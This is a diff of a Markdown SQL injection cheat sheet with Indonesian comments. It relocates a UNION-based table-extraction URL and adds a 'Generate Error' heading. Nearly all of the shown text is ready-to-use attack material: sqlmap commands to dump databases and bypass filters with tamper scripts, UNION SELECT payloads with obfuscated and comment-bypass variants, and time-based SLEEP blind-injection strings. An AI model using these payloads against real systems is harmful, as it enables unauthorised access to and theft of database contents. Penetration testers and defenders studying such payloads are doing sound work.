@@ -26,6 +26,7 @@
 ```
     sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --dump
     sqlmap -u 'http://google.com' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' union-char=els --banner //Digunakan jika server blok spasi dan menggunakan commen '#'
+    http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()— //extract table name
 ```
 
 ## Payload
@@ -35,9 +36,7 @@
 |`UNION SELECT asd`|`UNION SELECT` <br> `'UNION ALL SELECT` <br> `') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -`|
 |`+UNION+SELECT+1,2,(table_name),4,5+from+information_schema.tables--+`|`union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database()—`<br>`'union(select('asd');# ->digunakan ketika comment diblok` <br> `union(select(group_concat(table_name))from(information_schema.columns/tables)where(table_schema=database()));#`<br>`union select group_concat(table_name) from information_schema.tables where table_schema=schema(); —- - (MySQL)`|
 |' AND (SELECT 9160 FROM (SELECT(SLEEP(1-(IF(2085>2084,0,5)))))htyF) AND 'SyEv'='SyEv|' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))wMTT) AND 'pbuG'='pbuG|
-```
-http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()— //extract table name
-```
+
 
 |Database|Comment|
 |---|---|
@@ -46,6 +45,7 @@ http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_
 |PostgreSQL|`--comment` `/*comment*/`|
 |Microsoft|`--comment` `/*comment*/`|
 
+## Generate Error
   ```
   <spasi_kosong>
   '
